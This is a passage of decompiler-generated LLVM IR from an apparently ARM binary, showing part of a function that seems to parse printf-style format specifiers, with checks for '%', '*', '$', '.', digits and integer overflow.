  %stack_var_-36 = alloca i32, align 4
  %v3_14924 = load i32, i32* @r4, align 4
  store i32 %v3_14924, i32* %stack_var_-36, align 4
  %v6_14924 = load i32, i32* @r5, align 4
  %v27_14924 = load i32, i32* @lr, align 4
  %v0_14928 = load i32, i32* %r0.global-to-local, align 4
  %v1_14928 = add i32 %v0_14928, 16
  %v2_14928 = inttoptr i32 %v1_14928 to i32*
  %v3_14928 = load i32, i32* %v2_14928, align 4
  %v1_14930 = and i32 %v3_14928, 128
  store i32 %v1_14930, i32* @r4, align 4
  %v2_14930 = icmp eq i32 %v1_14930, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_14928, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @lr, align 4
  %v1_14958 = add i32 %v0_14928, 24
  %v2_14958 = inttoptr i32 %v1_14958 to i32*
  %v3_14958 = load i32, i32* %v2_14958, align 4
  store i32 %v3_14958, i32* %fp.global-to-local, align 4
  br i1 %v2_14930, label %.dec_label_pc_149ac_crit_edge, label %dec_label_pc_14964

.dec_label_pc_149ac_crit_edge:                    ; preds = %entry
  %v2_1495c = inttoptr i32 %v0_14928 to i32*
  %v3_1495c = load i32, i32* %v2_1495c, align 4
  store i32 %v3_1495c, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_149ac

dec_label_pc_14964:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_14974 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_14968

dec_label_pc_14968:                               ; preds = %dec_label_pc_14998.dec_label_pc_14968_crit_edge, %dec_label_pc_14964
  %v1_14978 = phi i32 [ %v1_14988, %dec_label_pc_14998.dec_label_pc_14968_crit_edge ], [ 0, %dec_label_pc_14964 ]
  %v0_14968 = phi i32 [ %v0_14968.pre, %dec_label_pc_14998.dec_label_pc_14968_crit_edge ], [ %v0_14928, %dec_label_pc_14964 ]
  %v1_14968 = inttoptr i32 %v0_14968 to i32*
  %v2_14968 = load i32, i32* %v1_14968, align 4
  %v4_1496c = mul i32 %v1_14978, 4
  %v5_1496c = add i32 %v2_14968, %v4_1496c
  store i32 %v5_1496c, i32* %r3.global-to-local, align 4
  %v1_14970 = add i32 %v5_1496c, -4
  %v2_14970 = inttoptr i32 %v1_14970 to i8*
  %v3_14970 = load i8, i8* %v2_14970, align 1
  %v4_14970 = zext i8 %v3_14970 to i32
  store i32 %v4_14970, i32* %r1.global-to-local, align 4
  store i32 %v2_14974, i32* @ip, align 4
  %v2_14978 = add i32 %v1_14978, %v2_14974
  store i32 %v2_14978, i32* %r2.global-to-local, align 4
  %v3_1497c = add i32 %v2_14978, -72
  %v4_1497c = inttoptr i32 %v3_1497c to i8*
  store i8 %v3_14970, i8* %v4_1497c, align 1
  %v0_14980 = load i32, i32* %r3.global-to-local, align 4
  %v1_14980 = add i32 %v0_14980, -4
  %v2_14980 = inttoptr i32 %v1_14980 to i32*
  %v3_14980 = load i32, i32* %v2_14980, align 4
  store i32 %v3_14980, i32* %r3.global-to-local, align 4
  %v0_14984 = load i32, i32* %r1.global-to-local, align 4
  %v9_14984 = icmp eq i32 %v0_14984, %v3_14980
  %v0_14988 = load i32, i32* %r0.global-to-local, align 4
  %v1_14988 = add i32 %v0_14988, 1
  store i32 %v1_14988, i32* %r0.global-to-local, align 4
  br i1 %v9_14984, label %dec_label_pc_14990, label %dec_label_pc_14e54

dec_label_pc_14990:                               ; preds = %dec_label_pc_14968
  %v2_14990 = icmp eq i32 %v3_14980, 0
  br i1 %v2_14990, label %dec_label_pc_149a0, label %dec_label_pc_14998

dec_label_pc_14998:                               ; preds = %dec_label_pc_14990
  %tmp182 = icmp ult i32 %v1_14988, 32
  br i1 %tmp182, label %dec_label_pc_14998.dec_label_pc_14968_crit_edge, label %dec_label_pc_149a0

dec_label_pc_14998.dec_label_pc_14968_crit_edge:  ; preds = %dec_label_pc_14998
  %v0_14968.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14968

dec_label_pc_149a0:                               ; preds = %dec_label_pc_14998, %dec_label_pc_14990
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_149a8 = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_149a8, i32* %r0.global-to-local, align 4
  %v0_149b8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_149ac

dec_label_pc_149ac:                               ; preds = %.dec_label_pc_149ac_crit_edge, %dec_label_pc_149a0
  %v3_149e0.pre-phi = phi i32 [ %.pre, %.dec_label_pc_149ac_crit_edge ], [ %v2_14974, %dec_label_pc_149a0 ]
  %v0_149d864 = phi i32 [ %v3_1495c, %.dec_label_pc_149ac_crit_edge ], [ %v2_149a8, %dec_label_pc_149a0 ]
  %v0_149b8 = phi i32 [ ptrtoint (i32* @global_var_22290.79 to i32), %.dec_label_pc_149ac_crit_edge ], [ %v0_149b8.pre, %dec_label_pc_149a0 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 196, i32* %r2.global-to-local, align 4
  %v2_149b8 = add i32 %v0_149b8, -36912
  store i32 %v2_149b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_149cc = inttoptr i32 %v2_149b8 to i8*
  store i8* %v4_149cc, i8** %stack_var_-120, align 4
  br label %dec_label_pc_149d8

dec_label_pc_149d4:                               ; preds = %.thread20, %dec_label_pc_14b08
  %v0_149d4 = phi i32 [ %v2_14b80, %.thread20 ], [ %v0_14ae476, %dec_label_pc_14b08 ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_14b08 ]
  store i32 %v0_149d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_149d8

dec_label_pc_149d8:                               ; preds = %dec_label_pc_149ac, %dec_label_pc_149d4
  %v1_149ec = phi i32 [ %v0_149d864, %dec_label_pc_149ac ], [ %v0_149d4, %dec_label_pc_149d4 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_149ac ], [ %stack_var_-44.0, %dec_label_pc_149d4 ]
  %v1_149d8 = inttoptr i32 %v1_149ec to i8*
  %v2_149d8 = load i8, i8* %v1_149d8, align 1
  %v3_149d8 = zext i8 %v2_149d8 to i32
  store i32 %v3_149d8, i32* %r3.global-to-local, align 4
  %v7_149dc = icmp eq i8 %v2_149d8, 42
  br i1 %v7_149dc, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_149d8
  store i32 %v1_149ec, i32* %r6.global-to-local, align 4
  %v0_149f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_149f0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14a38.preheader

bb:                                               ; preds = %dec_label_pc_149d8
  %v1_149e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_149e4 = load i32, i32* %sb.global-to-local, align 4
  %v4_149e4 = mul i32 %v2_149e4, %v1_149e4
  %v5_149e4 = add i32 %v4_149e4, %v3_149e0.pre-phi
  store i32 %v5_149e4, i32* %r3.global-to-local, align 4
  %v2_149ec = add i32 %v1_149ec, 1
  store i32 %v2_149ec, i32* %r6.global-to-local, align 4
  %v0_149f0111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_149f0111, i32* %r1.global-to-local, align 4
  %v3_149f4 = add i32 %v5_149e4, -40
  %v4_149f4 = inttoptr i32 %v3_149f4 to i32*
  store i32 %v0_149f0111, i32* %v4_149f4, align 4
  %v0_14a3c.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14a38.preheader

dec_label_pc_14a38.preheader:                     ; preds = %.thread8, %bb
  %v0_14a3c.pre = phi i32 [ %v1_149ec, %.thread8 ], [ %v0_14a3c.pre.pre, %bb ]
  %v0_14a40.pre = load i32, i32* @lr, align 4
  %v2_14a40 = add i32 %v0_14a40.pre, 196
  %v3_14a40 = inttoptr i32 %v2_14a40 to i32*
  br label %dec_label_pc_14a38

dec_label_pc_149fc:                               ; preds = %dec_label_pc_14a38
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_14a00 = load i32, i32* %r1.global-to-local, align 4
  %v2_14a00 = add i32 %v0_14a00, -214748363
  %tmp139 = sub i32 214748362, %v0_14a00
  %v6_14a00 = and i32 %tmp139, %v0_14a00
  %v7_14a00 = icmp slt i32 %v6_14a00, 0
  %v8_14a00 = icmp slt i32 %v2_14a00, 0
  %v9_14a00 = icmp eq i32 %v0_14a00, 214748363
  %v3_14a04 = xor i1 %v8_14a00, %v7_14a00
  %v4_14a04 = or i1 %v9_14a00, %v3_14a04
  br i1 %v4_14a04, label %dec_label_pc_14a1c, label %dec_label_pc_14a08

dec_label_pc_14a08:                               ; preds = %dec_label_pc_149fc
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_14a0c = icmp eq i32 %v0_14a00, 214748364
  br i1 %v9_14a0c, label %dec_label_pc_14a14, label %dec_label_pc_14a34

dec_label_pc_14a14:                               ; preds = %dec_label_pc_14a08
  %v8_14a18 = icmp ugt i8 %v2_14a3c, 55
  br i1 %v8_14a18, label %dec_label_pc_14a34, label %dec_label_pc_14a1c

dec_label_pc_14a1c:                               ; preds = %dec_label_pc_14a14, %dec_label_pc_149fc
  %v2_14a20 = mul i32 %v0_14a00, 10
  %v1_14a24 = add i32 %v2_14a20, -48
  store i32 %v1_14a24, i32* %r3.global-to-local, align 4
  %v2_14a28 = add i32 %v1_14a24, %v3_14a3c
  br label %dec_label_pc_14a34

dec_label_pc_14a34:                               ; preds = %dec_label_pc_14a14, %dec_label_pc_14a08, %dec_label_pc_14a1c
  %storemerge = phi i32 [ %v2_14a28, %dec_label_pc_14a1c ], [ 2147483647, %dec_label_pc_14a08 ], [ 2147483647, %dec_label_pc_14a14 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_14a34 = add i32 %v0_14abc, 1
  store i32 %v1_14a34, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14a38

dec_label_pc_14a38:                               ; preds = %dec_label_pc_14a38.preheader, %dec_label_pc_14a34
  %v0_14abc = phi i32 [ %v0_14a3c.pre, %dec_label_pc_14a38.preheader ], [ %v1_14a34, %dec_label_pc_14a34 ]
  store i32 196, i32* %r2.global-to-local, align 4
  %v1_14a3c = inttoptr i32 %v0_14abc to i8*
  %v2_14a3c = load i8, i8* %v1_14a3c, align 1
  %v3_14a3c = zext i8 %v2_14a3c to i32
  store i32 %v3_14a3c, i32* @ip, align 4
  %v4_14a40 = load i32, i32* %v3_14a40, align 4
  store i32 %v4_14a40, i32* %r3.global-to-local, align 4
  %v2_14a44 = mul nuw nsw i32 %v3_14a3c, 2
  store i32 %v2_14a44, i32* %r2.global-to-local, align 4
  %v2_14a48 = add i32 %v2_14a44, %v4_14a40
  %v3_14a48 = inttoptr i32 %v2_14a48 to i16*
  %v4_14a48 = load i16, i16* %v3_14a48, align 2
  %v6_14a48 = zext i16 %v4_14a48 to i32
  store i32 %v6_14a48, i32* %r3.global-to-local, align 4
  %v1_14a4c = and i32 %v6_14a48, 8
  %v2_14a4c = icmp eq i32 %v1_14a4c, 0
  br i1 %v2_14a4c, label %dec_label_pc_14a54, label %dec_label_pc_149fc

dec_label_pc_14a54:                               ; preds = %dec_label_pc_14a38
  %v0_14a54 = load i32, i32* %r0.global-to-local, align 4
  %v1_14a54 = add i32 %v0_14a54, -1
  %v2_14a54 = inttoptr i32 %v1_14a54 to i8*
  %v3_14a54 = load i8, i8* %v2_14a54, align 1
  %v4_14a54 = zext i8 %v3_14a54 to i32
  store i32 %v4_14a54, i32* %r3.global-to-local, align 4
  %v7_14a58 = icmp eq i8 %v3_14a54, 37
  br i1 %v7_14a58, label %dec_label_pc_14a60, label %dec_label_pc_14b20

dec_label_pc_14a60:                               ; preds = %dec_label_pc_14a54
  %v7_14a60 = icmp eq i8 %v2_14a3c, 36
  %. = zext i1 %v7_14a60 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_14a6c = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_14a6c, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_14a60
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_14a60, %bb144
  %v0_14a74 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_14a60 ]
  %v2_14a74 = icmp eq i32 %v0_14a74, 0
  %v0_14aa8 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_14a74, label %dec_label_pc_14aa8, label %dec_label_pc_14a7c

dec_label_pc_14a7c:                               ; preds = %thread-pre-split
  %v2_14aa8 = icmp eq i32 %v0_14aa8, 0
  %v1_14a80 = add i32 %v0_14abc, 1
  store i32 %v1_14a80, i32* %r0.global-to-local, align 4
  br i1 %v2_14aa8, label %dec_label_pc_14e54, label %dec_label_pc_14a88

dec_label_pc_14a88:                               ; preds = %dec_label_pc_14a7c
  %v2_14a88 = sub i32 %v0_14a6c, %v0_14aa8
  %v4_14a88 = xor i32 %v0_14aa8, %v0_14a6c
  %v5_14a88 = xor i32 %v2_14a88, %v0_14a6c
  %v6_14a88 = and i32 %v5_14a88, %v4_14a88
  %v7_14a88 = icmp slt i32 %v6_14a88, 0
  %v8_14a88 = icmp slt i32 %v2_14a88, 0
  %v9_14a88 = icmp eq i32 %v0_14a6c, %v0_14aa8
  %v3_14a8c = xor i1 %v8_14a88, %v7_14a88
  %v4_14a8c = or i1 %v9_14a88, %v3_14a8c
  br i1 %v4_14a8c, label %dec_label_pc_14a9c, label %bb145

bb145:                                            ; preds = %dec_label_pc_14a88
  store i32 %v0_14a6c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14a9c

dec_label_pc_14a98:                               ; preds = %dec_label_pc_14abc, %dec_label_pc_14ac4
  %v0_14a98 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14a98, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14a9c

dec_label_pc_14a9c:                               ; preds = %bb145, %dec_label_pc_14a88, %dec_label_pc_14a98
  %v0_14a9c = phi i32 [ %v0_14a54, %dec_label_pc_14a98 ], [ %v1_14a80, %dec_label_pc_14a88 ], [ %v1_14a80, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_14a98 ], [ %v0_14a6c, %dec_label_pc_14a88 ], [ %v0_14a6c, %bb145 ]
  store i32 %v0_14a9c, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_14ad8.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_14ad8 = ptrtoint i8* %v2_14ad8.pre to i32
  br label %dec_label_pc_14ad8

dec_label_pc_14aa8:                               ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_14aa8, 1
  br i1 %tmp146, label %dec_label_pc_14abc, label %dec_label_pc_14ab0

dec_label_pc_14ab0:                               ; preds = %dec_label_pc_14aa8
  %v7_14ab0 = icmp eq i8 %v2_14a3c, 109
  br i1 %v7_14ab0, label %dec_label_pc_14b20, label %dec_label_pc_14e54

dec_label_pc_14abc:                               ; preds = %dec_label_pc_14aa8
  %tmp183 = icmp ugt i32 %v0_14abc, %v0_14a54
  br i1 %tmp183, label %dec_label_pc_14ac4, label %dec_label_pc_14a98

dec_label_pc_14ac4:                               ; preds = %dec_label_pc_14abc
  %v1_14ac4 = inttoptr i32 %v0_14a54 to i8*
  %v2_14ac4 = load i8, i8* %v1_14ac4, align 1
  %v3_14ac4 = zext i8 %v2_14ac4 to i32
  store i32 %v3_14ac4, i32* %r3.global-to-local, align 4
  %v7_14ac8 = icmp eq i8 %v2_14ac4, 48
  br i1 %v7_14ac8, label %dec_label_pc_14a98, label %bb147

bb147:                                            ; preds = %dec_label_pc_14ac4
  %v1_14acc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_14acc, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14b20

dec_label_pc_14ad8.loopexit:                      ; preds = %dec_label_pc_14ae0
  %v1_14aec = load i32, i32* @r4, align 4
  %v3_14aec = or i32 %v1_14aec, %v0_14b00
  store i32 %v3_14aec, i32* @r4, align 4
  %v2_14af0 = add i32 %v0_14ae476, 1
  store i32 %v2_14af0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14ad8

dec_label_pc_14ad8:                               ; preds = %dec_label_pc_14ad8.loopexit, %dec_label_pc_14a9c
  %v0_14ae476 = phi i32 [ %v2_14af0, %dec_label_pc_14ad8.loopexit ], [ %v0_14a9c, %dec_label_pc_14a9c ]
  store i32 %v3_14ad8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_14ae4 = inttoptr i32 %v0_14ae476 to i8*
  br label %dec_label_pc_14ae0

dec_label_pc_14ae0:                               ; preds = %dec_label_pc_14af8, %dec_label_pc_14ad8
  %v0_14b00 = phi i32 [ %v2_14b00, %dec_label_pc_14af8 ], [ 1, %dec_label_pc_14ad8 ]
  %v0_14ae0 = phi i32 [ %v5_14ae0, %dec_label_pc_14af8 ], [ %v3_14ad8, %dec_label_pc_14ad8 ]
  %v1_14ae0 = inttoptr i32 %v0_14ae0 to i8*
  %v2_14ae0 = load i8, i8* %v1_14ae0, align 1
  %v3_14ae0 = zext i8 %v2_14ae0 to i32
  store i32 %v3_14ae0, i32* %r2.global-to-local, align 4
  %v5_14ae0 = add i32 %v0_14ae0, 1
  store i32 %v5_14ae0, i32* %r0.global-to-local, align 4
  %v2_14ae4 = load i8, i8* %v1_14ae4, align 1
  %v3_14ae4 = zext i8 %v2_14ae4 to i32
  store i32 %v3_14ae4, i32* %r3.global-to-local, align 4
  %v9_14ae8 = icmp eq i8 %v2_14ae4, %v2_14ae0
  br i1 %v9_14ae8, label %dec_label_pc_14ad8.loopexit, label %dec_label_pc_14af8

dec_label_pc_14af8:                               ; preds = %dec_label_pc_14ae0
  %v1_14af8 = inttoptr i32 %v5_14ae0 to i8*
  %v2_14af8 = load i8, i8* %v1_14af8, align 1
  %v3_14af8 = zext i8 %v2_14af8 to i32
  store i32 %v3_14af8, i32* %r3.global-to-local, align 4
  %v2_14afc = icmp eq i8 %v2_14af8, 0
  %v2_14b00 = mul i32 %v0_14b00, 2
  store i32 %v2_14b00, i32* %r1.global-to-local, align 4
  br i1 %v2_14afc, label %dec_label_pc_14b08, label %dec_label_pc_14ae0

dec_label_pc_14b08:                               ; preds = %dec_label_pc_14af8
  %v1_14b08 = add i32 %v0_14ae476, -1
  %v2_14b08 = inttoptr i32 %v1_14b08 to i8*
  %v3_14b08 = load i8, i8* %v2_14b08, align 1
  %v7_14b0c = icmp eq i8 %v3_14b08, 37
  %v0_14b10 = load i32, i32* @r4, align 4
  %v1_14b10 = and i32 %v0_14b10, 10
  store i32 %v1_14b10, i32* %r3.global-to-local, align 4
  %v4_14b14 = udiv i32 %v1_14b10, 2
  %v5_14b14 = sub nuw nsw i32 -1, %v4_14b14
  %v6_14b14 = and i32 %v0_14b10, %v5_14b14
  store i32 %v6_14b14, i32* @r4, align 4
  br i1 %v7_14b0c, label %dec_label_pc_14b1c, label %dec_label_pc_149d4

dec_label_pc_14b1c:                               ; preds = %dec_label_pc_14b08
  %v0_14b1c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14b1c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14b20

dec_label_pc_14b20:                               ; preds = %bb147, %dec_label_pc_14a54, %dec_label_pc_14ab0, %dec_label_pc_14b1c
  %v1_14b60 = phi i32 [ %v0_14ae476, %dec_label_pc_14b1c ], [ %v0_14abc, %bb147 ], [ %v0_14abc, %dec_label_pc_14ab0 ], [ %v0_14abc, %dec_label_pc_14a54 ]
  %v0_14b5c = phi i32 [ %v5_14ae0, %dec_label_pc_14b1c ], [ %v0_14a54, %bb147 ], [ %v0_14a54, %dec_label_pc_14ab0 ], [ %v0_14a54, %dec_label_pc_14a54 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_14b1c ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_14ab0 ], [ %stack_var_-44.1, %dec_label_pc_14a54 ]
  %v1_14b20 = inttoptr i32 %v0_14b5c to i8*
  %v2_14b20 = load i8, i8* %v1_14b20, align 1
  %v3_14b20 = zext i8 %v2_14b20 to i32
  store i32 %v3_14b20, i32* %r3.global-to-local, align 4
  %v7_14b24 = icmp eq i8 %v2_14b20, 42
  br i1 %v7_14b24, label %dec_label_pc_14b2c, label %dec_label_pc_14b6c

dec_label_pc_14b2c:                               ; preds = %dec_label_pc_14b20
  %v0_14b2c = load i32, i32* %fp.global-to-local, align 4
  %v2_14b2c = icmp eq i32 %v0_14b2c, 0
  br i1 %v2_14b2c, label %dec_label_pc_14b5c, label %dec_label_pc_14b34

dec_label_pc_14b34:                               ; preds = %dec_label_pc_14b2c
  %v1_14b34 = inttoptr i32 %v1_14b60 to i8*
  %v2_14b34 = load i8, i8* %v1_14b34, align 1
  %v3_14b34 = zext i8 %v2_14b34 to i32
  store i32 %v3_14b34, i32* %r3.global-to-local, align 4
  %v7_14b38 = icmp eq i8 %v2_14b34, 36
  br i1 %v7_14b38, label %dec_label_pc_14b40, label %dec_label_pc_14e54

dec_label_pc_14b40:                               ; preds = %dec_label_pc_14b34
  %v0_14b40 = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_14b40, 1
  br i1 %tmp148, label %dec_label_pc_14e54, label %dec_label_pc_14b48

dec_label_pc_14b48:                               ; preds = %dec_label_pc_14b40
  %v0_14b4c = load i32, i32* %r8.global-to-local, align 4
  %v1_14b4c = load i32, i32* %sb.global-to-local, align 4
  %v3_14b4c = mul i32 %v1_14b4c, %v0_14b4c
  %v4_14b4c = add i32 %v3_14b4c, %v3_149e0.pre-phi
  store i32 %v4_14b4c, i32* %r3.global-to-local, align 4
  %v1_14b50 = add i32 %v1_14b60, 1
  store i32 %v1_14b50, i32* %r6.global-to-local, align 4
  %v2_14b54 = add i32 %v4_14b4c, -12
  %v3_14b54 = inttoptr i32 %v2_14b54 to i32*
  store i32 %v0_14b40, i32* %v3_14b54, align 4
  br label %dec_label_pc_14b68

dec_label_pc_14b5c:                               ; preds = %dec_label_pc_14b2c
  %v1_14b5c = add i32 %v0_14b5c, 1
  store i32 %v1_14b5c, i32* %r3.global-to-local, align 4
  %v9_14b60 = icmp eq i32 %v1_14b5c, %v1_14b60
  br i1 %v9_14b60, label %dec_label_pc_14b68, label %dec_label_pc_14e54

dec_label_pc_14b68:                               ; preds = %dec_label_pc_14b5c, %dec_label_pc_14b48
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14b6c

dec_label_pc_14b6c:                               ; preds = %dec_label_pc_14b20, %dec_label_pc_14b68
  %v0_14b6c = load i32, i32* %r8.global-to-local, align 4
  %v2_14b6c = icmp eq i32 %v0_14b6c, 0
  br i1 %v2_14b6c, label %dec_label_pc_14b78, label %dec_label_pc_14b98.loopexit

dec_label_pc_14b78:                               ; preds = %dec_label_pc_14b6c
  %v0_14b78 = load i32, i32* %r6.global-to-local, align 4
  %v1_14b78 = inttoptr i32 %v0_14b78 to i8*
  %v2_14b78 = load i8, i8* %v1_14b78, align 1
  %v3_14b78 = zext i8 %v2_14b78 to i32
  store i32 %v3_14b78, i32* %r3.global-to-local, align 4
  %v7_14b7c = icmp eq i8 %v2_14b78, 46
  br i1 %v7_14b7c, label %.thread20, label %dec_label_pc_14b90

.thread20:                                        ; preds = %dec_label_pc_14b78
  %v2_14b80 = add i32 %v0_14b78, 1
  store i32 %v2_14b80, i32* %r6.global-to-local, align 4
  %v1_14b84 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_14b84, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_149d4

dec_label_pc_14b90:                               ; preds = %dec_label_pc_14b78
  %v0_14b90 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14b90, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_14b98

dec_label_pc_14b98.loopexit:                      ; preds = %dec_label_pc_14b6c
  %v1_14b70 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_14b70, i32* @r5, align 4
  %v0_14ba4.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14b98

dec_label_pc_14b98:                               ; preds = %dec_label_pc_14b98.loopexit, %dec_label_pc_14b90
  %v0_14ba4.pre = phi i32 [ %v0_14ba4.pre.pre, %dec_label_pc_14b98.loopexit ], [ %v0_14b78, %dec_label_pc_14b90 ]
  store i32 -37036, i32* %r3.global-to-local, align 4
  %v0_14b9c = load i32, i32* @lr, align 4
  %v2_14b9c = add i32 %v0_14b9c, -37036
  store i32 %v2_14b9c, i32* %r1.global-to-local, align 4
  %v1_14ba4 = inttoptr i32 %v0_14ba4.pre to i8*
  br label %dec_label_pc_14ba0

dec_label_pc_14ba0:                               ; preds = %dec_label_pc_14bb4, %dec_label_pc_14b98
  %v0_14bb4 = phi i32 [ %v1_14bb4, %dec_label_pc_14bb4 ], [ %v2_14b9c, %dec_label_pc_14b98 ]
  %v1_14ba0 = inttoptr i32 %v0_14bb4 to i8*
  %v2_14ba0 = load i8, i8* %v1_14ba0, align 1
  %v3_14ba0 = zext i8 %v2_14ba0 to i32
  store i32 %v3_14ba0, i32* %r2.global-to-local, align 4
  %v2_14ba4 = load i8, i8* %v1_14ba4, align 1
  %v3_14ba4 = zext i8 %v2_14ba4 to i32
  store i32 %v3_14ba4, i32* %r3.global-to-local, align 4
  %v9_14ba8 = icmp eq i8 %v2_14ba4, %v2_14ba0
  br i1 %v9_14ba8, label %bb149, label %dec_label_pc_14bb4

bb149:                                            ; preds = %dec_label_pc_14ba0
  %v2_14bac = add i32 %v0_14ba4.pre, 1
  store i32 %v2_14bac, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14bc0

dec_label_pc_14bb4:                               ; preds = %dec_label_pc_14ba0
  %v1_14bb4 = add i32 %v0_14bb4, 1
  %v2_14bb4 = inttoptr i32 %v1_14bb4 to i8*
  %v3_14bb4 = load i8, i8* %v2_14bb4, align 1
  %v4_14bb4 = zext i8 %v3_14bb4 to i32
  store i32 %v4_14bb4, i32* %r3.global-to-local, align 4
  store i32 %v1_14bb4, i32* %r1.global-to-local, align 4
  %v2_14bb8 = icmp eq i8 %v3_14bb4, 0
  br i1 %v2_14bb8, label %dec_label_pc_14bc0, label %dec_label_pc_14ba0

dec_label_pc_14bc0:                               ; preds = %dec_label_pc_14bb4, %bb149
  %v1_14be4 = phi i32 [ %v2_14bac, %bb149 ], [ %v0_14ba4.pre, %dec_label_pc_14bb4 ]
  %v1_14be0 = phi i32 [ %v0_14bb4, %bb149 ], [ %v1_14bb4, %dec_label_pc_14bb4 ]
  %v2_14bc8 = sub i32 %v1_14be0, %v2_14b9c
  store i32 %v2_14bc8, i32* %r3.global-to-local, align 4
  %v8_14bd0 = icmp sgt i32 %v2_14bc8, 1
  br i1 %v8_14bd0, label %.thread24, label %dec_label_pc_14bd4

dec_label_pc_14bd4:                               ; preds = %dec_label_pc_14bc0
  %v1_14bd4 = inttoptr i32 %v1_14be4 to i8*
  %v2_14bd4 = load i8, i8* %v1_14bd4, align 1
  %v3_14bd4 = zext i8 %v2_14bd4 to i32
  store i32 %v3_14bd4, i32* %r2.global-to-local, align 4
  %v1_14bd8 = inttoptr i32 %v1_14be0 to i8*
  %v2_14bd8 = load i8, i8* %v1_14bd8, align 1
  %v3_14bd8 = zext i8 %v2_14bd8 to i32
  store i32 %v3_14bd8, i32* %r3.global-to-local, align 4
  %v9_14bdc = icmp eq i8 %v2_14bd4, %v2_14bd8
  br i1 %v9_14bdc, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_14bd4
  %v2_14be0 = add i32 %v1_14be0, 9
  store i32 %v2_14be0, i32* %r1.global-to-local, align 4
  %v2_14be4 = add i32 %v1_14be4, 1
  store i32 %v2_14be4, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_14bd4, %dec_label_pc_14bc0, %bb150
  %v0_14bec = phi i32 [ %v1_14be0, %dec_label_pc_14bd4 ], [ %v1_14be0, %dec_label_pc_14bc0 ], [ %v2_14be0, %bb150 ]
  %v0_14be8 = phi i32 [ %v1_14be4, %dec_label_pc_14bd4 ], [ %v1_14be4, %dec_label_pc_14bc0 ], [ %v2_14be4, %bb150 ]
  %v1_14be8 = inttoptr i32 %v0_14be8 to i8*
  %v2_14be8 = load i8, i8* %v1_14be8, align 1
  %v3_14be8 = zext i8 %v2_14be8 to i32
  store i32 %v3_14be8, i32* %r2.global-to-local, align 4
  %v1_14bec = add i32 %v0_14bec, 9
  %v2_14bec = inttoptr i32 %v1_14bec to i8*
  %v3_14bec = load i8, i8* %v2_14bec, align 1
  %v4_14bec = zext i8 %v3_14bec to i32
  store i32 %v4_14bec, i32* %r3.global-to-local, align 4
  %v2_14bf0 = icmp eq i8 %v2_14be8, 0
  %v3_14bf4 = mul nuw nsw i32 %v4_14bec, 256
  store i32 %v3_14bf4, i32* @ip, align 4
  br i1 %v2_14bf0, label %dec_label_pc_14e54, label %dec_label_pc_14bfc

dec_label_pc_14bfc:                               ; preds = %.thread24
  store i32 -36936, i32* %r3.global-to-local, align 4
